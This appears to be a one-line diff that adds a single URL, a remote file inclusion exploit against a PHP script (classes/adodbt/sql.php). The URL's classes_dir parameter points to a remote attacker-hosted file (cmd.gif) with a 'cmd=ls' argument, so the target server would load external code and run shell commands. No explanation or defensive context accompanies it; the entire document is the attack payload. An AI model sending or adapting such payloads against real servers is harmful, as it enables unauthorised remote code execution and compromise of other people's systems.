@@ -1,0 +1,1 @@
+http://www.example.com/classes/adodbt/sql.php?classes_dir=http://www.example2.com/cmd.gif?cmd=ls
